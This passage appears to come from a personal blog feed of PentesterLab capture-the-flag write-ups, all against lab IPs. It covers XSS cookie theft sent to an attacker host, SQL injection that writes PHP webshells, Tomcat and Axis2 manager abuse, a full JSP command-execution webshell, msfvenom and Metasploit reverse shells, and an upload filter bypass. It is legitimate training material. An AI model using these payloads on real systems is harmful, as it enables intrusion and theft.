<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>it looks like zap has already inject <code>&lt;script&gt;alert(1);&lt;/script&gt;</code> into that page. If you visit the link &ldquo;<a href="http://192.168.79.168/post.php?id=1">http://192.168.79.168/post.php?id=1</a>&rdquo;, it will pop up an alert 1.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>We can use this xss vulnerability to steal admin&rsquo;s cookie.</p>

<p>keep going &hellip;</p>

<p>Before stealing admin&rsquo;s cookie, we have to setup listener on attacking machine,</p>

<p><code>python -m SimpleHTTPServer 4444</code></p>

<p>use this payload instead of alert(1) in the xss (use firebug to edit the html)</p>

<p><code>&lt;script&gt;document.write('&lt;img src="http://192.168.79.156:4444/?'+document.cookie+'  "/&gt;');&lt;/script&gt;</code></p>

<p>192.168.79.156 is attacker&rsquo;s machine.</p>

<p>Now we got the cookie.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>put the cookie in Cookie Manager+</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>now visit <code>http://192.168.79.168/admin/</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Let&rsquo;s explore the admin&rsquo;s pages. First, click <code>edit</code>, it will go to <code>http://192.168.79.168/admin/edit.php?id=2</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p>now looks like the url contains injection point, lets try to use single quote:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=2'</code></p>

<p>we get error message:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we know that the web sites' absolute path is &ldquo;/var/www/&rdquo;</p>

<p>From <a href="https://pentesterlab.com/exercises/from_sqli_to_shell/course">pentesterlab</a></p>

<p>Exploiting SQL injection using UNION follows the steps below:</p>

<p> 1   Find the number of columns to perform the UNION
 2   Find what columns are echoed in the page
 3   Retrieve information from the database meta-tables
 4   Retrieve information from other tables/databases</p>

<p>In order to perform a request by SQL injection, you need to find the number of columns that are returned by the first part of the query. Unless you have the source code of the application, you will have to guess this number.</p>

<p>There are two methods to get this information:</p>

<p>1   using UNION SELECT and increase the number of columns;
2   using ORDER BY statement.</p>

<p>Here we use order by statement to get the number of columns</p>

<p><code>http://192.168.79.168/admin/edit.php?id=2 order by 4 --</code> good
<code>http://192.168.79.168/admin/edit.php?id=2 order by 5 --</code> error</p>

<p>Now that we know the number of columns, we can retrieve information from the database. Based on the error message we received, we know that the backend database used is MySQL.</p>

<p>get DB version:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,@@version,4</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>get /etc/passwd file:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,load_file("/etc/passwd"),4</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>get user info:</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0%20UNION%20SELECT%201,2,user(),4</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>since the user is root, now we can deploy a webshell&hellip;</p>

<p>use <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> to create evil.php under css folder. Encode <code>http://192.168.79.168/admin/edit.php?id=0 UNION SELECT 1,2,"&lt;?php @eval($_POST['pass'];)?&gt;",4 into outfile "/var/www/css/evil.php"</code> part.</p>

<p>Now we can see that the evil.php is created successfully.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_022.png" title="[title manually exploit [alt text]]" ></p>

<p>Cool&hellip; Lets write webshell now</p>

<p><code>http://192.168.79.168/admin/edit.php?id=0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>

<p>of course. encode <code>0 UNION select 1,2,"&lt;?php system($_GET['c']); ?&gt;",4 into outfile "/var/www/css/webshell.php"</code></p>

<p>Now run command:</p>

<p><code>http://192.168.79.168/css/webshell.php?c=cat /etc/passwd</code></p>

<p>encode <code>/etc/passwd</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/Selection_023.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/xssandmysql/tumblr_nqnzzzQJGq1rbc9h1o1_500.gif" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--Axis2 Web service and Tomcat Manager ]]></title>
    <link href="http://wg135.github.io/blog/2016/04/05/pentesterlab/"/>
    <updated>2016-04-05T14:46:46-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/05/pentesterlab</id>
    <content type="html"><![CDATA[<p><em>When you engage in actual fighting, if victory is long in coming, then men&rsquo;s weapons will grow dull and their ardor will be damped. If you lay siege to a town, you will exhaust your strength.</em> &mdash;&ndash; The Art of War</p>

<p>This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server. &mdash;Pentesterlab</p>

<p>Difficluty: 3/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>wfuzz</li>
<li>nc</li>
<li>msfvenom</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;Nmap</li>
<li>Burte force hidden path of the server. &mdash;-wfuzz</li>
<li>generate webshell. &mdash;msfvenom</li>
<li>backdoor. &mdash;nc</li>
<li>webshell. &mdash;Car.arr</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><code>nmap -sV -v -A 192.168.79.168</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Use wfuzz to burte force hidden path of the server</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.168/FUZZ 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we find that the server host a web service using Axis2.</p>

<p>In order to test is the web server using Tomcat, we can try to visit a non-existing web page and watch the 404 error page.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we find the server uses Tomcat and we get the version of the Tomcat. Keep going&hellip;</p>

<p>Lets check the path axis2/ , we get the page:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>get the list of the available services by visiting the page <code>http://192.168.79.168/axis2/services/listServices</code> or click the serices link</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>The WSDL information can be accessed by clicking the service&rsquo;s name in the listServices page or directly using the following URL: <code>http://192.168.79.168/axis2/services/ProxyService?wsdl</code>.</p>

<p>We can see that <code>get</code> operation is defined in WSDL</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>Axis2 provides an easy way to call Web services, you just need to follow the pattern <a href="http://">http://</a>[WS_URL]/method?parameters</p>

<h4>Attack</h4>

<h4>Easy way</h4>

<p>Get Tomcat manager configuration to get login credentials.
In Debian Linux, the tomcat configuration file tomcat-users.xml has default location: /etc/tomcat6/tomcat-users.xml</p>

<p>So we can try:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.79.168/axis2/services/ProxyService/get?uri=file:///etc/tomcat6/tomcat-users.xml</span></code></pre></td></tr></table></div></figure>


<p>Then we get the Tomcat manager&rsquo;s credentials:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>the tomcat manager-gui login password can be found: username: manager password: !mp0ss!bl32gu355</p>

<p>Then login tomcat manager from the URL <a href="http://192.168.79.168/manager/html">http://192.168.79.168/manager/html</a> to upload and deploy JSP webshell in WAR file.</p>

<h4>deploy webshell</h4>

<p>Generate webshell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
</span><span class='line'>$ cd webshell
</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.79.156 LPORT=4444 -f raw &gt; sh4.jsp
</span><span class='line'>$ jar -cvf ../webshell.war *
</span></code></pre></td></tr></table></div></figure>


<p>Then uplpad the websehll.war to manager page</p>

<p>in Kali setup nc:</p>

<p><code>nc -nlvp 4444</code></p>

<p>go to <code>http://192.168.79.168/webshell/sh4.jsp</code></p>

<p>then you will get the shell:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<h4>&lsquo;Hard&rsquo; way</h4>

<p>In Debian Linux, the axis2 configuration file axis2.xml has default location: <code>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</code></p>

<p>so we can visit this page by using,</p>

<p><code>http://192.168.79.168/axis2/services/ProxyService/get?uri=file:///var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</code></p>

<p>from axis2.xml, we find the credential is admin/axis2</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>Then login axis2 admin page from the URL <code>http://192.168.79.168/axis2/axis2-admin/</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>then try to upload webshell.war we used in last method.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>Looks like it doesn&rsquo;t support the war file format. WTF, okay, try harder.</p>

<p>After google search, I found a webshell for axis2,  called <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">Cat.arr</a></p>

<p>Download it and upload it to the server, it requres host IP and port number:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>192.168.79.168/axis2/services/Cat/shell?host=192.168.79.156&port=6666</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>Oh&hellip;..</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/axis2/gameover.jpeg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--cve-2007-1860]]></title>
    <link href="http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860/"/>
    <updated>2016-04-05T12:04:47-05:00</updated>
    <id>http://wg135.github.io/blog/2016/04/05/pentesterlab-cve-2007-1860</id>
    <content type="html"><![CDATA[<p><em>By means of these seven considerations I can forecast victory or defeat.</em> &mdash;&ndash; The Art of War</p>

<p>This course details the exploitation of a vulnerability in mod_jk and how by using this issue it is possible to access the administration interface of a Tomcat server (Tomcat&rsquo;s manager). Then using this access, we will see how an attacker can use default credentials to log in as administrator and use this access to gain code execution on the server. &mdash;Pentesterlab</p>

<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>NC</li>
<li>Firebug</li>
<li>webshell</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;&ndash; Nmap</li>
<li>Check http headers. &mdash;&ndash; NC</li>
<li>Exploit and upload webshell. &mdash;- Firebug</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>By checking the application HTTP headers with nc, I can also get Apache service version.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
</span><span class='line'>Host: 192.168.79.168</span></code></pre></td></tr></table></div></figure>


<p></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<h4>Attack</h4>

<p>First of all, we need to figure out the architecture of Tomcat and Apache. Read <a href="https://pentesterlab.com/exercises/cve-2007-1860/course">here</a></p>

<p>If we try to visit a non-exist page, we will receive 404 error like that:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>Based on the result, we know the http request is processed by Apache.</p>

<p>If we try to visit page like 192.168.79.168/examples/jsp/test404, we will get the 404 error like:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>Then we know that the http request is processed by Tomcat through Apache.</p>

<p>Tomcat Manager is available at the following URI: /manager/html and is, most of the time, protected by a password. The CVE-2007-1860 vulnerability is described <a href="http://mail-archives.apache.org/mod_mbox/tomcat-dev/200706.mbox/%3C4667755F.6070700@apache.org%3E">advisory</a></p>

<p>From pentesterlab,</p>

<p><em>If you provide this %252e to a vulnerable modjk, it will perform a first decoding and send the value %2e to Tomcat. Tomcat will then perform a second decoding to get the value .. If you use %252e%252e, you will then be able to send .. to Tomcat. If you try to send .. directly to Apache, it will not forward the request to Tomcat unless the path resolve to a path configured to be forwarded to Tomcat (using <code>modjk</code>).</em></p>

<p>Now we know how to access the /manager/html, (Sometimes you may need to repeat several times %252e%252e/)</p>

<p><code>http://192.168.79.168/examples/jsp/%252e%252e/%252e%252e/manager/html</code></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>The credentials are one of the default ones. In this exerciese, the admin didn&rsquo;t change the credentials. The user name is admin and password is empty. Once we get it, we are able to get acces to the Tomcat Manager.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Now we need to create a webshell and upload it to the Tomcat.</p>

<h4>Deploy a webshell</h4>

<p>webshell (from pentesterlab, you may generate it using msfvenom)</p>

<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='jsp'><span class='line'><span class="nt">&lt;FORM</span> <span class="na">METHOD=</span><span class="s">GET</span> <span class="na">ACTION=</span><span class="s">&#39;index.jsp&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;INPUT</span> <span class="na">name=</span><span class="s">&#39;cmd&#39;</span> <span class="na">type=</span><span class="s">text</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;INPUT</span> <span class="na">type=</span><span class="s">submit</span> <span class="na">value=</span><span class="s">&#39;Run&#39;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/FORM&gt;</span>
</span><span class='line'><span class="k">&lt;%@</span> <span class="n">page</span> <span class="n">import</span><span class="o">=</span><span class="s">&quot;java.io.*&quot;</span> <span class="k">%&gt;</span>
</span><span class='line'><span class="k">&lt;%</span>
</span><span class='line'>   <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&quot;cmd&quot;</span><span class="o">);</span>
</span><span class='line'>   <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span><span class="o">;</span>
</span><span class='line'>   <span class="k">if</span><span class="o">(</span><span class="n">cmd</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>      <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>      <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>         <span class="n">Process</span> <span class="n">p</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmd</span><span class="o">,</span><span class="kc">null</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
</span><span class='line'>         <span class="n">BufferedReader</span> <span class="n">sI</span> <span class="o">=</span> <span class="k">new</span> <span class="nf">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="nf">InputStreamReader</span><span class="o">(</span><span class="n">p</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">()));</span>
</span><span class='line'>         <span class="k">while</span><span class="o">((</span><span class="n">s</span> <span class="o">=</span> <span class="n">sI</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span> <span class="n">output</span> <span class="o">+=</span> <span class="n">s</span><span class="o">+</span><span class="s">&quot;&lt;/br&gt;&quot;</span><span class="o">;</span> <span class="o">}</span>
</span><span class='line'>      <span class="o">}</span>  <span class="k">catch</span><span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>   <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>   <span class="o">}</span>
</span><span class='line'>   <span class="o">}</span>
</span><span class='line'><span class="k">%&gt;</span>
</span><span class='line'><span class="nt">&lt;pre&gt;</span><span class="k">&lt;%=</span><span class="n">output</span> <span class="k">%&gt;</span><span class="nt">&lt;/pre&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>now we have to  pack the webshell</p>

<figure class='code'><figcaption><span>index.jsp</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='jsp'><span class='line'>$ mkdir webshell
</span><span class='line'>$ cp index.jsp webshell
</span><span class='line'>
</span><span class='line'>$ cd webshell
</span><span class='line'>$ jar -cvf ../webshell.war *
</span></code></pre></td></tr></table></div></figure>


<p>webshell <code>webshell.war</code> is ready to fire.</p>

<h4>Upload webshell</h4>

<p>We can use the form to upload war file:
<img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>However, it will give you a 404 page since the deployment url does not use the double -encoding trick to gain access to get the manager. So we have to use firebug to give the form right location.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>change the location to :</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>After successful uploading webshell, it will show in the Tomcat manager:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>now enjoy the webshell by accessing</p>

<p><code>http://192.168.79.168/examples/%252e%252e/webshell/</code></p>

<p> <img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>DONE</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--cve-2012-1823]]></title>
    <link href="http://wg135.github.io/blog/2016/03/30/pentesterlab-cve-2012-1823/"/>
    <updated>2016-03-30T15:51:10-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/30/pentesterlab-cve-2012-1823</id>
    <content type="html"><![CDATA[<p><em>All warfare is based on deception. Hence, when we are able to attack, we must seem unable; when using our forces, we must appear inactive; when we are near, we must make the enemy believe we are far away; when far away, we must make him believe we are near.</em> &mdash;&ndash; The Art of War</p>

<p>This course details the exploitation of the PHP CGI bug (CVE-2012-1823) and how an attacker can use it to retrieve arbitrary code and gain code execution on a server using this bug.</p>

<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>NC</li>
<li>Metasploit</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;&ndash; Nmap</li>
<li>Check php version and other http headers. &mdash;&ndash; NC</li>
<li>Exploit and get the shell. &mdash;&ndash; Metasploit</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>By checking the application HTTP headers with nc, I can get php version.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
</span><span class='line'>Host: 192.168.79.166</span></code></pre></td></tr></table></div></figure>


<p></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<h4>Attack</h4>

<p>I got the php version is 5.3.3. If I seach this php version&rsquo;s vulnerability., I find that:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>This is may be exploitable. Next I use metasploit to verify that. In msfconsole,</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>search php_cgi</span></code></pre></td></tr></table></div></figure>


<p>Only one exploit pops up, which is <code>exploit/multi/http/php_cgi_arg_injection</code></p>

<p>next just set RHOST, LHOST, PAYLOAD I use <code>generic/shell_reverse_tcp</code>. ATTACK!!!</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>Done.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentesterlab--From SQL Injection to Shell]]></title>
    <link href="http://wg135.github.io/blog/2016/03/29/pentesterlab/"/>
    <updated>2016-03-29T15:16:56-05:00</updated>
    <id>http://wg135.github.io/blog/2016/03/29/pentesterlab</id>
    <content type="html"><![CDATA[<p><em>All warfare is based on deception. Hence, when we are able to attack, we must seem unable; when using our forces, we must appear inactive; when we are near, we must make the enemy believe we are far away; when far away, we must make him believe we are near.</em> &mdash;&ndash; The Art of War</p>

<p>This course details the exploitation of SQL injection in a PHP based website and how an attacker can use it to gain access to the administration pages.</p>

<p>Difficluty: 2/5</p>

<!--more-->


<h3>Forces:</h3>

<ul>
<li>Nmap</li>
<li>NC</li>
<li>wfuzz</li>
<li>sqlmap</li>
<li>Burp</li>
<li>webshell</li>
</ul>


<h3>Detail Assessment and Planning</h3>

<ul>
<li>Port scan to identify opened ports, running services and services version. &mdash;-Nmap</li>
<li>Check php version and other http headers. &mdash;-NC</li>
<li>Scan all requests and pages. &mdash;-wfuzz</li>
<li>SQL injection and get admin password. &mdash;- sqlmap</li>
<li>Get the php request path. &mdash;-Burp</li>
<li>Get the web shell &mdash;- webshell</li>
</ul>


<h3>Waging War</h3>

<h4>Weaknesses and Strengths</h4>

<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>By checking the application HTTP headers with nc, I can get php version.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
</span><span class='line'>Host: 192.168.79.165</span></code></pre></td></tr></table></div></figure>


<p></p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>The tool wfuzz can be used to detect directories and pages on the web server using brute force.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://192.168.79.165/FUZZ </span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://192.168.79.165/FUZZ.php </span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<h4>Attack</h4>

<p>There is one page I want to try cat.php</p>

<p>In order to upload my websell, one thing I need to do is get admin. I use sqlmap to dump user&rsquo;s information:</p>

<p><code>sqlmap -u " sqlmap -u "http://192.168.79.165/cat.php?id=2" --dump"</code>, after a while, I got this:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>looks like I get the admin&rsquo;s password is P4ssw0rd and md5 hash. I also use John and ripper to verifyed the md5, the result matches P4ssw0rd.</p>

<p>Lets try to login use this password:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>success&hellip;.. keep going.</p>

<p>There is a page can be used to upload new picture.
<img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>Let&rsquo;s try to upload php web shell.</p>

<figure class='code'><figcaption><span>upload1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;cmd&quot;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>The result is:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>The application filters .php file.</p>

<p>Okay, let&rsquo;s try to change the file name to upload2.php3 with the same code.</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>done</p>

<p>Then I want to get the path to that page using Burp</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>get the shell:</p>

<p><img src="http://wg135.github.io/images/blog/pentesterlab/fromsqltoshell/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

